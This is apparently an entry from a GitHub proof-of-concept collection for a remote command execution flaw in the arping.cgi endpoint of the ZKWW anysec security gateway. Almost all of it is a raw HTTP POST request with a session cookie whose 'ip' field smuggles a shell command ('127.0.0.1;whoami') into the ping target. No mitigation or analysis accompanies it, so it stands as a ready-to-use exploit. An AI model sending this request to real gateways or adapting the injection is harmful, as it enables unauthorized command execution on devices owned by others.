# zkww_arping.cgi_rce

from: https://github.com/wy876/POC/blob/main/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81%E7%A7%91%E6%8A%80/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81anysec%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3arping%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
product: 中科网威anysec安全网关

```
POST /cgi-bin/system/arping.cgi HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Connection: keep-alive
Cookie: CGISID=2ZuEDPfh3Yxu6hyiAmyZpxIHymc9vSfxGJbcqhtl8RP51; sdmenu_my_menu=100000000
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: frame
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4

moduleid=150&tasknum=1&ip=127.0.0.1;whoami&interface=wan0&count=4&sip=8.8.8.8&x=58&y=16
```
